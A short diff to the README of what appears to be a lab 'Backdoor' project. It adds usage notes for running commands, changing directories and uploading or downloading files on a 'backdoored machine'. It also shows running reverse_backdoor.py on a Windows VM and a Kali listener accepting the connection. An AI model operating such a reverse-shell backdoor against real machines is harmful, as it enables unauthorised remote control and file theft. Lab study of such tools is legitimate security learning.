@@ -1,5 +1,10 @@
 # Backdoor
 
+## Usage
+
+Execute commands on backdoored machine, including `cd` and upload and download of files.
+Use `exit` to quit.
+
 ## Kicking the Tyres
 
 On the Kali VM:
@@ -13,6 +18,8 @@ On the Windows VM
 ```shell
 backdoor> ..\venv\Scripts\python.exe .\reverse_backdoor.py
 ```
+
+Back to the Kali machine:
 
 ```shell
 [+] Accepted connection from 192.168.122.63:51872
